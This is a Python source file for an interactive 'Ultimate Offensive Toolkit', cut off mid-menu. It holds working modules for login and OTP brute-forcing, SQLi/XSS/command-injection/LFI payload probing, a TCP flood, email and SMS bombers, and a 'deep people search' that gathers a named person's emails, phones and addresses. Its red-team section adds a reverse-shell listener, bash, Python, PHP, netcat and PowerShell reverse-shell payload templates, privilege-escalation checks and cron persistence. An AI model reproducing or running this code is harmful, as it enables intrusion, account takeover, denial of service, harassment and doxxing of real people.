#!/usr/bin/env python3
"""
ULTIMATE OFFENSIVE TOOLKIT – DEEP PEOPLE SEARCH INCLUDED
"""
import asyncio, re, json, os, random, time, socket, urllib.parse, smtplib, threading, subprocess
from datetime import datetime
from pathlib import Path
from email.mime.text import MIMEText
import aiohttp
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from rich.console import Console
from rich.table import Table
import logging

init(autoreset=True)
console = Console()
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", handlers=[logging.FileHandler("scraper.log"), logging.StreamHandler()])
log = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]
COMMON_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "test", "root", "toor", "1234", "administrator"]

def random_ua(): return random.choice(USER_AGENTS)
def normalize_url(url: str) -> str:
    url = url.strip()
    if not url: raise ValueError("Empty URL")
    if not url.startswith(("http://", "https://")): url = "https://" + url
    return url

class StealthMixer:
    @staticmethod
    async def random_sleep(min_sec=0.5, max_sec=3.0):
        await asyncio.sleep(random.uniform(min_sec, max_sec))
    @staticmethod
    def noisy_headers():
        return {"User-Agent": random_ua(), "Accept-Language": random.choice(["en-US,en;q=0.9", "en;q=0.8"]), "Referer": random.choice(["https://google.com/", "https://duckduckgo.com/"]), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}

class PersonalExtractor:
    patterns = {"email": [r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'], "phone": [r'\(\d{3}\)\s*\d{3}[-.]?\d{4}'], "address": [r'\b\d+\s+[A-Za-z0-9\s,]+(?:Street|St|Avenue|Ave)\b']}
    def extract(self, html, url):
        result = {"source_url": url, "data": {}}
        for field, regex_list in self.patterns.items():
            matches = set()
            for regex in regex_list:
                for m in re.findall(regex, html, re.I):
                    val = m.strip() if isinstance(m, str) else m[0].strip()
                    if val: matches.add(val)
            if matches: result["data"][field] = list(matches)
        return result

class SocialExtractor:
    platforms = {"linkedin": r'linkedin\.com/[^\s"\'<>]+', "twitter": r'twitter\.com/[^\s"\'<>]+', "facebook": r'facebook\.com/[^\s"\'<>]+'}
    def extract(self, html, url):
        result = {"source_url": url, "data": {}}
        for plat, regex in self.platforms.items():
            matches = re.findall(regex, html, re.I)
            if matches: result["data"][plat] = list(set(matches))
        return result

class DataExporter:
    @staticmethod
    def to_txt(data, filename, title="Report"):
        lines = [f"=== {title} ===", ""]
        for key, val in data.items():
            if isinstance(val, list) and val:
                lines.append(f"{key.replace('_',' ').title()}:")
                for item in val[:30]:
                    lines.append(f"  - {item}")
                lines.append("")
        text = "\n".join(lines)
        try:
            Path(filename).write_text(text, encoding='utf-8')
            log.info(f"TXT → {filename}")
        except Exception as e:
            log.error(f"TXT error: {e}")
        console.print(f"[bold cyan]{title}[/bold cyan]")
        for line in lines:
            console.print(line)

def show_table(title, columns, rows):
    table = Table(title=title, show_lines=True)
    for col in columns: table.add_column(col)
    for row in rows: table.add_row(*[str(c) for c in row])
    console.print(table)

class AdvancedScraper:
    async def scrape_url(self, url):
        url = normalize_url(url); headers = StealthMixer.noisy_headers()
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=headers, timeout=30) as r:
                    if r.status != 200: return {"success": False, "error": f"HTTP {r.status}"}
                    html = await r.text()
        except Exception as e: return {"success": False, "error": str(e)}
        personal = PersonalExtractor().extract(html, url)
        social = SocialExtractor().extract(html, url)
        rows = []
        for f, vals in personal["data"].items():
            if vals: rows.append(["Personal", f, "\n".join(vals[:5])])
        for f, vals in social["data"].items():
            if vals: rows.append(["Social", f, "\n".join(vals[:5])])
        if rows: show_table("Scrape Results", ["Category","Field","Values"], rows)
        DataExporter.to_txt({"url":url, "emails":personal["data"].get("email",[]), "social":social["data"]}, f"output/scrape_{datetime.now():%Y%m%d_%H%M%S}.txt", "Scrape")
        return {"success": True, "url": url, "personal": personal, "social": social}

    async def crawl(self, start_url, max_depth=2):
        start_url = normalize_url(start_url); visited, to_visit = set(), [start_url]; results = []
        headers = StealthMixer.noisy_headers()
        async with aiohttp.ClientSession() as session:
            for _ in range(max_depth):
                next_level = []
                for url in to_visit:
                    if url in visited: continue
                    visited.add(url)
                    try:
                        async with session.get(url, headers=headers, timeout=30) as resp:
                            if resp.status != 200: continue
                            html = await resp.text()
                    except: continue
                    soup = BeautifulSoup(html, "lxml")
                    for a in soup.find_all("a", href=True):
                        href = urllib.parse.urljoin(url, a["href"])
                        if urllib.parse.urlparse(href).netloc == urllib.parse.urlparse(start_url).netloc:
                            if href not in visited: next_level.append(href)
                    personal = PersonalExtractor().extract(html, url)
                    social = SocialExtractor().extract(html, url)
                    results.append({"url":url, "personal":personal, "social":social})
                to_visit = next_level
        console.print(f"[green]Crawled {len(results)} pages[/green]")
        DataExporter.to_txt({"crawl_results":results}, f"output/crawl_{datetime.now():%Y%m%d_%H%M%S}.txt", f"Crawl of {start_url}")
        return results

    async def search_images(self, query, count=5):
        imgs = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://duckduckgo.com/",
                                       params={"q":query, "iax":"images", "ia":"images"},
                                       headers=StealthMixer.noisy_headers(), timeout=15) as r:
                    html = await r.text() if r.status == 200 else ""
                soup = BeautifulSoup(html, "lxml")
                for img in soup.select("img.tile--img__img"):
                    src = img.get("src") or img.get("data-src")
                    if src and not src.startswith("data:"):
                        if src.startswith("//"): src = "https:" + src
                        if "duckduckgo.com/assets/" not in src and len(imgs) < count:
                            imgs.append(src)
        except: pass
        if imgs:
            table = Table(title="Image Search Results")
            table.add_column("URL")
            for url in imgs: table.add_row(url)
            console.print(table)
        return imgs

class BruteForcer:
    async def brute_force(self, url, method, user_field, pass_field, usernames, passwords, extra_data=None, success_regex=r"(?i)(welcome|dashboard|logout|success)"):
        valid = []; headers = StealthMixer.noisy_headers(); base = extra_data.copy() if extra_data else {}
        async with aiohttp.ClientSession() as session:
            for user in usernames:
                for pwd in passwords:
                    data = {user_field: user, pass_field: pwd}
                    data.update(base)
                    try:
                        if method.upper() == "POST":
                            async with session.post(url, data=data, headers=headers, timeout=10) as resp:
                                if re.search(success_regex, await resp.text()): valid.append((user, pwd))
                        else:
                            async with session.get(url, params=data, headers=headers, timeout=10) as resp:
                                if re.search(success_regex, await resp.text()): valid.append((user, pwd))
                    except: pass
                    await asyncio.sleep(random.uniform(0.1, 0.5))
        if valid:
            table = Table(title="Valid Credentials")
            table.add_column("Username"); table.add_column("Password")
            for u,p in valid: table.add_row(u,p)
            console.print(table)
        else: console.print("[red]No valid credentials found.[/red]")
        return valid

    async def directory_bruteforce(self, base_url, wordlist, extensions=[""], success_statuses=[200,301,302,403]):
        found = []; headers = StealthMixer.noisy_headers()
        async with aiohttp.ClientSession() as session:
            async def check(path):
                await StealthMixer.random_sleep(0.2, 0.8)
                try:
                    async with session.get(path, headers=headers, timeout=10) as r:
                        if r.status in success_statuses: return (path, r.status)
                except: pass
                return None
            tasks = [check(urllib.parse.urljoin(base_url, w+ext)) for w in wordlist for ext in extensions]
            for r in await asyncio.gather(*tasks):
                if r: found.append(r)
        if found:
            table = Table(title="Directories Found")
            table.add_column("URL"); table.add_column("Status")
            for path, code in found: table.add_row(path, str(code))
            console.print(table)
        else: console.print("[red]No directories found.[/red]")
        return found

    async def otp_bruteforce(self, url, otp_field, success_regex=r"(?i)(success|welcome|dashboard)", extra_data=None, otp_list=None):
        if otp_list is None: otp_list = [f"{i:04d}" for i in range(10000)]
        valid_otp = None; headers = StealthMixer.noisy_headers(); base = extra_data.copy() if extra_data else {}
        semaphore = asyncio.Semaphore(20)
        async with aiohttp.ClientSession() as session:
            async def test(otp):
                async with semaphore:
                    data = {otp_field: otp}; data.update(base)
                    try:
                        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                            if re.search(success_regex, await resp.text(), re.I): return otp
                    except: pass
                    return None
            tasks = [test(otp) for otp in otp_list]
            for i in range(0, len(tasks), 100):
                chunk = tasks[i:i+100]
                for r in await asyncio.gather(*chunk):
                    if r: valid_otp = r; break
                if valid_otp: break
        if valid_otp:
            console.print(f"[green]Valid OTP: {valid_otp}[/green]")
            DataExporter.to_txt({"url":url,"valid_otp":valid_otp}, f"output/otp_{datetime.now():%Y%m%d_%H%M%S}.txt","OTP Brute-Force")
        else: console.print("[red]No valid OTP found.[/red]")
        return valid_otp

class Spider:
    async def run(self, start_url, max_depth=2, max_pages=30):
        start_url = normalize_url(start_url); base_domain = urllib.parse.urlparse(start_url).netloc
        visited, to_visit = set(), [start_url]; emails = set(); pages = 0
        headers = StealthMixer.noisy_headers()
        async with aiohttp.ClientSession() as session:
            for _ in range(max_depth):
                next_level = []
                for url in to_visit:
                    if url in visited or pages >= max_pages: continue
                    visited.add(url); pages += 1
                    try:
                        async with session.get(url, headers=headers, timeout=30) as resp:
                            if resp.status != 200: continue
                            html = await resp.text()
                    except: continue
                    emails.update(re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', html))
                    soup = BeautifulSoup(html, "lxml")
                    for a in soup.find_all("a", href=True):
                        href = urllib.parse.urljoin(url, a["href"])
                        if urllib.parse.urlparse(href).netloc == base_domain and href not in visited:
                            next_level.append(href)
                to_visit = next_level
        if emails:
            table = Table(title=f"Harvested Emails from {start_url}")
            table.add_column("Email")
            for e in emails: table.add_row(e)
            console.print(table)
        else: console.print("[red]No emails found.[/red]")
        return {"emails": list(emails), "pages_crawled": pages}

class OffensiveScanner:
    async def sqli_scan(self, url, params=None):
        payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]; results = []
        async with aiohttp.ClientSession() as s:
            for p in payloads:
                test = {k:p for k in (params or [])} if params else {"test":p}
                try:
                    async with s.get(url, params=test, timeout=10) as r:
                        if re.search(r"(SQL|mysql_fetch|ORA-|unclosed)", await r.text(), re.I): results.append(p)
                except: pass
        if results: console.print("[yellow]SQLi Payloads Triggered:[/yellow]"); [console.print(r) for r in results]
        else: console.print("[green]No SQLi vulnerabilities detected.[/green]")
        return results

    async def xss_scan(self, url, params=None):
        payloads = ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>"]; results = []
        async with aiohttp.ClientSession() as s:
            for p in payloads:
                test = {k:p for k in (params or [])} if params else {"test":p}
                try:
                    async with s.get(url, params=test, timeout=10) as r:
                        if p in await r.text(): results.append(p)
                except: pass
        if results: console.print("[yellow]Reflected XSS payloads:[/yellow]"); [console.print(r) for r in results]
        else: console.print("[green]No XSS detected.[/green]")
        return results

    async def csrf_check(self, url):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=StealthMixer.noisy_headers(), timeout=10) as r: html = await r.text()
        except: return []
        soup = BeautifulSoup(html, "lxml"); missing = []
        for form in soup.find_all("form"):
            if not any(inp.get("name","").lower() in ["csrf_token","_token","authenticity_token"] for inp in form.find_all("input")):
                missing.append({"action": form.get("action", url), "method": form.get("method","GET").upper()})
        if missing:
            table = Table(title="CSRF Missing Tokens")
            table.add_column("Form Action"); table.add_column("Method")
            for m in missing: table.add_row(m["action"], m["method"])
            console.print(table)
        else: console.print("[green]All forms have CSRF tokens.[/green]")
        return missing

    async def port_scan(self, host, ports):
        open_ports = []
        for p in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(1.5)
            if sock.connect_ex((host, p)) == 0: open_ports.append(p)
            sock.close()
            await asyncio.sleep(0.1)
        if open_ports:
            table = Table(title=f"Open Ports on {host}")
            table.add_column("Port")
            for p in open_ports: table.add_row(str(p))
            console.print(table)
        else: console.print("[red]No open ports found.[/red]")
        return open_ports

    async def subdomain_enum(self, domain, wordlist):
        found = []
        async with aiohttp.ClientSession() as s:
            async def check(sub):
                url = f"http://{sub}.{domain}"
                try:
                    async with s.get(url, timeout=5) as r:
                        if r.status == 200: found.append(url)
                except: pass
            await asyncio.gather(*[check(sub) for sub in wordlist])
        if found:
            table = Table(title=f"Subdomains of {domain}")
            table.add_column("URL")
            for f in found: table.add_row(f)
            console.print(table)
        else: console.print("[red]No subdomains found.[/red]")
        return found

    async def command_injection_check(self, url, params=None):
        payloads = [";id", "|id", "`id`", "$(id)"]; results = []
        async with aiohttp.ClientSession() as s:
            for p in payloads:
                test = {k:p for k in (params or [])} if params else {"test":p}
                try:
                    async with s.get(url, params=test, timeout=10) as r:
                        if "uid=" in await r.text() or "gid=" in await r.text(): results.append(p)
                except: pass
        if results: console.print("[yellow]Command injection possible with:[/yellow]"); [console.print(r) for r in results]
        else: console.print("[green]No command injection detected.[/green]")
        return results

    async def lfi_rfi_probe(self, url, params=None):
        payloads = ["../../../../etc/passwd", "/etc/passwd", "php://filter/convert.base64-encode/resource=index"]; results = []
        async with aiohttp.ClientSession() as s:
            for p in payloads:
                test = {k:p for k in (params or [])} if params else {"file":p}
                try:
                    async with s.get(url, params=test, timeout=10) as r:
                        text = await r.text()
                        if "root:x:" in text or "base64" in text.lower(): results.append(p)
                except: pass
        if results: console.print("[yellow]LFI/RFI possible with:[/yellow]"); [console.print(r) for r in results]
        else: console.print("[green]No LFI/RFI detected.[/green]")
        return results

    async def rate_limit_bypass(self, url, count=50):
        async with aiohttp.ClientSession() as s:
            tasks = [s.get(url, headers=StealthMixer.noisy_headers()) for _ in range(count)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            statuses = [r.status if hasattr(r,'status') else None for r in responses]
        rate_limited = 429 in statuses
        console.print(f"Requests sent: {count}, Rate‑Limited: {rate_limited}")
        return {"total": count, "rate_limited": rate_limited}

    def tcp_flood(self, target_ip, port=80, duration=10):
        def flood():
            stop = time.time() + duration
            while time.time() < stop:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.3)
                    s.connect((target_ip, port)); s.send(b"GET / HTTP/1.1\r\n\r\n"); s.close()
                except: pass
        for _ in range(20): threading.Thread(target=flood).start()
        console.print(f"[yellow]TCP flood started on {target_ip}:{port}[/yellow]")

class EmailBomber:
    async def send(self, smtp_server, smtp_port, username, password, target, subject, body, count):
        def run():
            server = smtplib.SMTP(smtp_server, smtp_port); server.starttls(); server.login(username, password)
            msg = MIMEText(body); msg['Subject']=subject; msg['From']=username; msg['To']=target
            for _ in range(count): server.sendmail(username, target, msg.as_string()); time.sleep(0.5)
            server.quit()
        threading.Thread(target=run).start()
        console.print(f"[green]Email bomb launched to {target}[/green]")

class SMSBomber:
    async def send(self, phone, count, carrier=None, message="Test"):
        gateways = {"verizon":"vtext.com","att":"txt.att.net","tmobile":"tmomail.net","sprint":"messaging.sprintpcs.com"}
        to_list = [f"{phone}@{gateways[carrier]}"] if carrier and carrier in gateways else [f"{phone}@{g}" for g in gateways.values()]
        gmail_user = os.environ.get("GMAIL_USER"); gmail_pass = os.environ.get("GMAIL_PASS")
        if not gmail_user or not gmail_pass:
            console.print("[red]Set GMAIL_USER and GMAIL_PASS environment variables first.[/red]")
            return
        def run():
            server = smtplib.SMTP("smtp.gmail.com", 587); server.starttls(); server.login(gmail_user, gmail_pass)
            msg = MIMEText(message); msg['Subject']="SMS"; msg['From']=gmail_user
            for to in to_list:
                msg['To']=to
                for _ in range(count): server.sendmail(gmail_user, to, msg.as_string()); time.sleep(0.5)
            server.quit()
        threading.Thread(target=run).start()
        console.print(f"[green]SMS bomb launched to {phone}[/green]")

class DeepPeopleSearch:
    async def search(self, name, location=""):
        full_query = f'"{name}"'
        if location:
            full_query += f' "{location}"'
        query = f'{full_query} (email OR phone OR linkedin OR twitter OR facebook)'
        search_url = f"https://www.google.com/search?q={urllib.parse.quote(query)}&num=10&hl=en"
        headers = StealthMixer.noisy_headers()
        html = ""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(search_url, headers=headers, timeout=15) as resp:
                    if resp.status == 200: html = await resp.text()
            except: pass
        if not html:
            try:
                async with session.get(f"https://duckduckgo.com/html/?q={urllib.parse.quote(query)}", headers=headers, timeout=15) as resp:
                    if resp.status == 200: html = await resp.text()
            except: pass
        if not html:
            console.print("[red]Search engines unreachable.[/red]")
            return {}
        soup = BeautifulSoup(html, "lxml")
        urls = []
        for a in soup.select("a[href]"):
            href = a.get("href")
            if href and "/url?q=" in href:
                real = urllib.parse.parse_qs(urllib.parse.urlparse(href).query).get("q",[None])[0]
                if real and "google.com" not in real:
                    urls.append(real)
                    if len(urls) >= 5: break
        if not urls:
            for a in soup.select("a.result__a"):
                href = a.get("href")
                if href: urls.append(href)
                if len(urls) >= 5: break
        console.print(f"[cyan]Found {len(urls)} pages. Deep scanning...[/cyan]")
        all_emails = set(); all_phones = set(); all_addresses = set()
        all_social = {"linkedin":[],"twitter":[],"facebook":[],"instagram":[],"github":[]}
        all_pages = []
        scraper = AdvancedScraper()
        spider = Spider()
        tasks = [scraper.scrape_url(u) for u in urls]
        scrape_results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, res in enumerate(scrape_results):
            if isinstance(res, Exception): continue
            if res.get("success"):
                personal = res.get("personal",{}).get("data",{})
                social = res.get("social",{}).get("data",{})
                if "email" in personal: all_emails.update(personal["email"])
                if "phone" in personal: all_phones.update(personal["phone"])
                if "address" in personal: all_addresses.update(personal["address"])
                for plat, links in social.items(): all_social[plat].extend(links)
                all_pages.append({"url":urls[i]})
        domains = set()
        for u in urls:
            parsed = urllib.parse.urlparse(u)
            dom = f"{parsed.scheme}://{parsed.netloc}"
            if dom not in domains:
                domains.add(dom)
        if domains:
            spider_tasks = [spider.run(d, max_depth=1, max_pages=10) for d in domains]
            spider_results = await asyncio.gather(*spider_tasks, return_exceptions=True)
            for sr in spider_results:
                if isinstance(sr, dict) and "emails" in sr:
                    all_emails.update(sr["emails"])
        for plat in all_social: all_social[plat] = list(set(all_social[plat]))
        # Display
        console.print(f"\n[bold green]Deep Search Results for: {name}[/bold green]")
        table = Table(title="Deep Search Results", show_lines=True)
        table.add_column("Category", style="cyan")
        table.add_column("Field", style="magenta")
        table.add_column("Values", style="green")
        def add_row(cat, field, values):
            if isinstance(values, list) and values:
                table.add_row(cat, field, "\n".join(values[:10]))
            elif values:
                table.add_row(cat, field, str(values))
        add_row("Contact", "Emails", list(all_emails))
        add_row("Contact", "Phones", list(all_phones))
        add_row("Contact", "Addresses", list(all_addresses))
        for plat, links in all_social.items():
            if links: add_row("Social", plat.capitalize(), links)
        if all_pages: table.add_row("Sources", "Scraped URLs", "\n".join([p["url"] for p in all_pages[:5]]))
        console.print(table)
        result = {"name":name, "location":location, "emails":list(all_emails), "phones":list(all_phones), "addresses":list(all_addresses), "social":all_social, "pages":[p["url"] for p in all_pages]}
        DataExporter.to_txt(result, f"output/deep_people_{datetime.now():%Y%m%d_%H%M%S}.txt", f"Deep Search: {name}")
        return result

# Red team modules
class ReverseShellHandler:
    def __init__(self): self.server = None
    async def listen(self, port):
        console.print(f"[yellow]Listening on 0.0.0.0:{port} for reverse shell...[/yellow]")
        self.server = await asyncio.start_server(self._handle_client, '0.0.0.0', port)
        async with self.server: await self.server.serve_forever()
    async def _handle_client(self, reader, writer):
        console.print(f"[green]Incoming connection from {writer.get_extra_info('peername')}[/green]")
        writer.write(b"Connected to reverse shell handler\n")
        while True:
            cmd = await asyncio.to_thread(input, "revsh> ")
            if cmd.lower() == 'exit': break
            writer.write(cmd.encode() + b'\n'); await writer.drain()
            data = await reader.read(4096); console.print(data.decode(errors='replace'))
        writer.close(); await writer.wait_closed()
    async def start(self, port):
        try: await self.listen(port)
        except Exception as e: console.print(f"[red]Error: {e}[/red]")

class PayloadGenerator:
    PAYLOADS = {
        "bash": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": "nc -e /bin/sh {ip} {port}",
        "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    }
    def generate(self, payload_type, ip, port):
        template = self.PAYLOADS.get(payload_type)
        if template: return template.format(ip=ip, port=port)
        return None
    async def interactive(self):
        console.print("[cyan]Payload Generator[/cyan]")
        for name in self.PAYLOADS: console.print(f"  {name}")
        choice = input("Payload type: ").strip(); ip = input("Listener IP: ").strip(); port = input("Listener port: ").strip()
        payload = self.generate(choice, ip, port)
        if payload: console.print(f"[green]Generated payload:[/green]\n{payload}")
        else: console.print("[red]Unknown type[/red]")

class LocalPrivEscChecker:
    def check(self):
        results = []
        try:
            suid = subprocess.check_output("find / -perm -4000 -type f 2>/dev/null", shell=True).decode().splitlines()
            results.append(("SUID binaries", suid[:10]))
        except: pass
        try:
            if os.access('/etc/passwd', os.W_OK): results.append(("Writable /etc/passwd", True))
        except: pass
        try:
            cron = subprocess.check_output("ls -la /etc/cron* 2>/dev/null", shell=True).decode()
            results.append(("Cron jobs", cron[:200]))
        except: pass
        try:
            sudo_ver = subprocess.check_output("sudo --version 2>/dev/null | head -1", shell=True).decode()
            results.append(("Sudo version", sudo_ver))
        except: pass
        try:
            ww = subprocess.check_output("find / -writable -type f 2>/dev/null | head -20", shell=True).decode()
            results.append(("World-writable files", ww[:200]))
        except: pass
        return results
    async def run(self):
        console.print("[yellow]Checking local privilege escalation vectors...[/yellow]")
        results = self.check()
        if results:
            table = Table(title="Local PrivEsc Checks")
            table.add_column("Check"); table.add_column("Details")
            for name, detail in results: table.add_row(name, str(detail)[:100])
            console.print(table)
        else: console.print("[red]No obvious vectors found.[/red]")

class PersistenceTester:
    async def add_cron(self, command):
        try:
            cron_line = f"* * * * * {command}\n"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True, check=True)
            console.print(f"[green]Cron job added: {command}[/green]")
        except Exception as e: console.print(f"[red]Failed: {e}[/red]")
    async def remove_cron(self, command):
        try:
            subprocess.run(f'crontab -l | grep -v "{command}" | crontab -', shell=True, check=True)
            console.print(f"[green]Cron job removed: {command}[/green]")
        except Exception as e: console.print(f"[red]Failed: {e}[/red]")
    async def interactive(self):
        console.print("[yellow]Persistence Tester[/yellow]")
        action = input("Add or remove cron? (add/remove): ").strip().lower()
        if action == 'add':
            cmd = input("Command to run: ").strip()
            await self.add_cron(cmd)
        elif action == 'remove':
            cmd = input("Command to remove: ").strip()
            await self.remove_cron(cmd)

async def main():
    console.print("[bold cyan]Welcome to the Ultimate Offensive Toolkit![/bold cyan]")
    while True:
        console.print("\n1. Scrape URL","2. Crawl site","3. Image Search","4. Stealth Fetch",
                      "5. Brute-Force Login","6. Directory Brute","7. Spider Emails",
                      "8. SQLi Scan","9. XSS Scan","10. CSRF Check","11. Port Scan",
                      "12. Subdomain Enum","13. CMD Injection","14. LFI/RFI Probe",
                      "15. Rate-Limit Bypass","16. TCP Flood","17. Email Bomber",
                      "18. SMS Bomber","19. OTP Brute-Force","20. Deep People Search",
                      "21. AI Command","22. Exit",
                      "23. Reverse Shell Listener","24. Payload Generator",
                      "25. Local PrivEsc Check","26. Persistence Tester", sep="\n")
        c = input("Choice: ").strip()

        if c == "1":
            url = input("URL: ").strip()
            if url: await AdvancedScraper().scrape_url(url)
        elif c == "2":
            url = input("Start URL: ").strip()
            depth = int(input("Max depth [2]: ") or 2)
            await AdvancedScraper().crawl(url, depth)
        elif c == "3":
            q = input("Query: ").strip()
            n = int(input("How many [5]: ") or 5)
            await AdvancedScraper().search_images(q, n)
        elif c == "4":
            url = input("URL: ").strip()
            html = None
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(url, headers=StealthMixer.noisy_headers()) as r:
                        if r.status == 200: html = await r.text()
            except: pass
            console.print(html[:1000] if html else "[red]Failed[/red]")
        elif c == "5":
            url = input("Login URL: ").strip()
            method = input("Method (GET/POST) [POST]: ").strip() or "POST"
            uf = input("Username field: ").strip()
            pf = input("Password field: ").strip()
            users = [u.strip() for u in input("Usernames (comma): ").split(",")]
            pwds_str = input("Passwords (comma, or empty for default): ").strip()
            pwds = [p.strip() for p in pwds_str.split(",")] if pwds_str else COMMON_PASSWORDS
            extra = input("Extra POST data (key=value&...): ").strip()
            extra_dict = dict(urllib.parse.parse_qsl(extra)) if extra else None
            await BruteForcer().brute_force(url, method, uf, pf, users, pwds, extra_dict)
        elif c == "6":
            base = input("Base URL: ").strip()
            words = [w.strip() for w in input("Wordlist (comma): ").split(",")]
            exts = input("Extensions (comma) [.php]: ").strip()
            exts = exts.split(",") if exts else [".php"]
            await BruteForcer().directory_bruteforce(base, words, exts)
        elif c == "7":
            url = input("Domain: ").strip()
            depth = int(input("Max depth [2]: ") or 2)
            pages = int(input("Max pages [30]: ") or 30)
            await Spider().run(url, depth, pages)
        elif c == "8":
            url = input("URL: ").strip()
            params_str = input("Params (key=value, comma): ").strip()
            params = {k:v for k,v in [p.split("=") for p in params_str.split(",")]} if params_str else None
            await OffensiveScanner().sqli_scan(url, params)
        elif c == "9":
            url = input("URL: ").strip()
            params_str = input("Params (key=value, comma): ").strip()
            params = {k:v for k,v in [p.split("=") for p in params_str.split(",")]} if params_str else None
            await OffensiveScanner().xss_scan(url, params)
        elif c == "10":
            url = input("URL: ").strip()
            await OffensiveScanner().csrf_check(url)
        elif c == "11":
            host = input("Host: ").strip()
            ports_str = input("Ports (comma, or default): ").strip()
            ports = [int(p) for p in ports_str.split(",")] if ports_str else [21,22,23,25,53,80,110,143,443,3389,8080,8443]
            await OffensiveScanner().port_scan(host, ports)
        elif c == "12":
            domain = input("Domain: ").strip()
            words_str = input("Wordlist (comma, or default): ").strip()
            words = words_str.split(",") if words_str else ["www","mail","ftp","admin","dev","api","blog","shop","secure","portal"]
            await OffensiveScanner().subdomain_enum(domain, words)
        elif c == "13":
            url = input("URL: ").strip()
            params_str = input("Params (key=value, comma): ").strip()
            params = {k:v for k,v in [p.split("=") for p in params_str.split(",")]} if params_str else None
            await OffensiveScanner().command_injection_check(url, params)
        elif c == "14":
            url = input("URL: ").strip()
            params_str = input("Params (key=value, comma): ").strip()
            params = {k:v for k,v in [p.split("=") for p in params_str.split(",")]} if params_str else None
            await OffensiveScanner().lfi_rfi_probe(url, params)
        elif c == "15":
            url = input("URL: ").strip()
            count = int(input("Requests [50]: ") or 50)
            await OffensiveScanner().rate_limit_bypass(url, count)
        elif c == "16":
            ip = input("Target IP: ").strip()
            port = int(input("Port [80]: ") or 80)
            dur = int(input("Duration [10]: ") or 10)
            OffensiveScanner().tcp_flood(ip, port, dur)
        elif c == "17":
            smtp = input("SMTP server [smtp.gmail.com]: ").strip() or "smtp.gmail.com"
            port = int(input("SMTP port [587]: ") or 587)
            user = input("Sender email: ").strip()
            pwd = input("Sender password: ").strip()
            target = input("Target email: ").strip()
            sub = input("Subject: ").strip() or "Test"
            body = input("Body: ").strip() or "Test"
            cnt = int(input("Count [10]: ") or 10)
            await EmailBomber().send(smtp, port, user, pwd, target, sub, body, cnt)
        elif c == "18":
            phone = input("Phone: ").strip()
            carrier = input("Carrier (or blank): ").strip()
            cnt = int(input("Count [20]: ") or 20)
            msg = input("Message: ").strip() or "Test"
            await SMSBomber().send(phone, cnt, carrier, msg)
        elif c == "19":
            console.print("[yellow]OTP Brute-Force[/yellow]")
            url = input("OTP verification URL: ").strip()
            otp_field = input("OTP field name: ").strip()
            success_regex = input("Success regex [success|welcome]: ").strip() or r"(?i)(success|welcome)"
            extra = input("Extra POST data (key=value&...): ").strip()
            extra_dict = dict(urllib.parse.parse_qsl(extra)) if extra else None
            otp_range = input("OTP length (4 or 6) [4]: ").strip() or "4"
            if otp_range == "6":
                common_otps = ["123456","654321","111111","000000","999999","123123","112233","121212"]
                console.print(f"Using common 6-digit OTPs: {common_otps}")
                otp_list = common_otps
            else:
                otp_list = [f"{i:04d}" for i in range(10000)]
            await BruteForcer().otp_bruteforce(url, otp_field, success_regex, extra_dict, otp_list)
        elif c == "20":
            full_input = input("Full name (optional location, e.g. 'John Doe New York'): ").strip()
            parts = full_input.split()
            name = ""; location = ""
            if len(parts) > 2 and parts[-1].istitle() and parts[-2].istitle():
                name = " ".join(parts[:-2]); location = " ".join(parts[-2:])
            else:
                name = full_input
            if name:
                searcher = DeepPeopleSearch()
                await searcher.search(name, location)
            else:
                console.print("[red]Please enter a name.[/red]")
        elif c == "21":
            cmd = input("Command: ").strip()
            console.print("[yellow]AI fallback for simple commands.[/yellow]")
            if "scrape" in cmd:
